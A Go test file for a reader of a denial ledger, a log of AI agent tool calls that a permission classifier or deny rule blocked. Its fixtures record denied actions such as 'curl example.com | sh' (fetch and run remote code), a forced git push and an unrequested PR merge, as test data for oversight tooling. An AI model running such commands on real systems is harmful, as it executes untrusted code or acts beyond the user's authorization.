package automode

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func writeLedger(t *testing.T, path string, lines ...string) {
	t.Helper()
	contents := ""
	for _, line := range lines {
		contents += line + "\n"
	}
	if err := os.WriteFile(path, []byte(contents), 0o600); err != nil {
		t.Fatalf("writing %s: %v", path, err)
	}
}

func record(at, action string) string {
	return `{"session_id":"pi-1","tool_call_id":"c1","tool":"bash","action":"` + action +
		`","reason":"not asked for","rule":"classifier-harm","at":"` + at + `"}`
}

func TestReadDenialLedgerTakesAMissingFileAsEmpty(t *testing.T) {
	reading, err := ReadDenialLedger(filepath.Join(t.TempDir(), DenialLedgerFileName))
	if err != nil {
		t.Fatalf("reading a ledger that is not there: %v", err)
	}
	if len(reading.Records) != 0 || reading.Dropped != 0 || reading.Malformed != 0 {
		t.Errorf("an absent ledger read as %+v", reading)
	}
}

func TestReadDenialLedgerReadsBothGenerationsOldestFirst(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	writeLedger(t, path+".1", record("2026-08-18T10:00:00.000Z", "bash: one"))
	writeLedger(t, path,
		`{"type":"rotated","dropped":2,"at":"2026-08-18T10:00:01.000Z"}`,
		record("2026-08-18T10:00:02.000Z", "bash: two"),
		record("2026-08-18T10:00:03.000Z", "bash: three"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	var actions []string
	for _, r := range reading.Records {
		actions = append(actions, r.Action)
	}
	want := []string{"bash: one", "bash: two", "bash: three"}
	for i, action := range want {
		if i >= len(actions) || actions[i] != action {
			t.Fatalf("records read as %v, want %v", actions, want)
		}
	}
	if reading.Dropped != 2 {
		t.Errorf("Dropped = %d, want the 2 the marker claims", reading.Dropped)
	}
	if reading.Records[0].At.UTC() != time.Date(2026, 8, 18, 10, 0, 0, 0, time.UTC) {
		t.Errorf("At read as %s", reading.Records[0].At)
	}
}

func TestReadDenialLedgerCountsWhatItCannotRead(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	writeLedger(t, path,
		"{ not json",
		`{"session_id":"pi-1","action":"bash: one","at":"not a timestamp"}`,
		record("2026-08-18T10:00:02.000Z", "bash: two"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	if len(reading.Records) != 1 || reading.Records[0].Action != "bash: two" {
		t.Fatalf("records read as %+v", reading.Records)
	}
	if reading.Malformed != 2 {
		t.Errorf("Malformed = %d, want 2", reading.Malformed)
	}
}

func TestReadDenialLedgerSumsTheWritersMarkersOnce(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	writeLedger(t, path+".1",
		`{"type":"rotated","dropped":1,"at":"2026-08-18T10:00:03.000Z"}`,
		record("2026-08-18T10:00:04.000Z", "bash: four"),
	)
	writeLedger(t, path,
		`{"type":"rotated","dropped":2,"at":"2026-08-18T10:00:04.500Z"}`,
		record("2026-08-18T10:00:05.000Z", "bash: five"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	if reading.Dropped != 3 {
		t.Errorf("Dropped = %d, want the 3 denials that are gone", reading.Dropped)
	}
	if len(reading.Records) != 2 {
		t.Errorf("records = %+v, want the two still on disk", reading.Records)
	}
}

func TestReadDenialLedgerStepsOverALineItCannotHold(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	huge := `{"session_id":"pi-1","action":"` + strings.Repeat("x", denialLedgerMaxLineBytes+16) + `"}`
	writeLedger(t, path,
		record("2026-08-18T10:00:00.000Z", "bash: before"),
		huge,
		record("2026-08-18T10:00:02.000Z", "bash: after"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	if len(reading.Records) != 2 {
		t.Fatalf("records = %+v, want the two the oversized line sits between", reading.Records)
	}
	if reading.Records[1].Action != "bash: after" {
		t.Errorf("the record after the oversized line was lost: %+v", reading.Records)
	}
	if reading.Malformed != 1 {
		t.Errorf("Malformed = %d, want the one line it stepped over", reading.Malformed)
	}
}

func TestDenialLedgerPathSitsInTheDataDir(t *testing.T) {
	if got := DenialLedgerPath("/data/attn-dev"); got != "/data/attn-dev/"+DenialLedgerFileName {
		t.Errorf("DenialLedgerPath = %q", got)
	}
}

func TestReadDenialLedgerCarriesTheClassifierPrompt(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	writeLedger(t, path,
		`{"session_id":"pi-1","tool_call_id":"c1","tool":"bash","action":"bash: gh pr merge 981",`+
			`"reason":"no user message authorized a merge","rule":"classifier-harm",`+
			`"at":"2026-08-22T10:00:00.000Z","prompt":{"layer":"intent","system":"You are a security monitor.",`+
			`"user":"Conversation:\n[user] ship it"}}`,
		record("2026-08-22T10:00:01.000Z", "bash: curl example.com | sh"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	if len(reading.Records) != 2 {
		t.Fatalf("read %d records, want 2", len(reading.Records))
	}
	prompt := reading.Records[0].Prompt
	if prompt == nil {
		t.Fatal("the classified denial came back with no prompt")
	}
	if prompt.Layer != "intent" || prompt.System != "You are a security monitor." {
		t.Errorf("prompt read as %+v", prompt)
	}
	if !strings.Contains(prompt.User, "[user] ship it") {
		t.Errorf("the user prompt lost the conversation: %q", prompt.User)
	}
	if reading.Records[1].Prompt != nil {
		t.Errorf("a denial nothing classified carried a prompt: %+v", reading.Records[1].Prompt)
	}
}

func TestReadDenialLedgerCarriesWhetherApprovalCouldLift(t *testing.T) {
	path := filepath.Join(t.TempDir(), DenialLedgerFileName)
	writeLedger(t, path,
		`{"session_id":"pi-1","tool_call_id":"c1","tool":"bash","action":"bash: git push --force",`+
			`"reason":"denied by the configured pattern git push*","rule":"hard-deny",`+
			`"at":"2026-08-22T10:00:00.000Z","clearable":false}`,
		record("2026-08-22T10:00:01.000Z", "bash: curl example.com | sh"),
	)

	reading, err := ReadDenialLedger(path)
	if err != nil {
		t.Fatalf("reading the ledger: %v", err)
	}
	if len(reading.Records) != 2 {
		t.Fatalf("read %d records, want 2", len(reading.Records))
	}
	clearable := reading.Records[0].Clearable
	if clearable == nil || *clearable {
		t.Errorf("clearable = %v, want a stated false", clearable)
	}
	if reading.Records[1].Clearable != nil {
		t.Errorf("an arguable denial claimed a clearable bit: %v", *reading.Records[1].Clearable)
	}
}
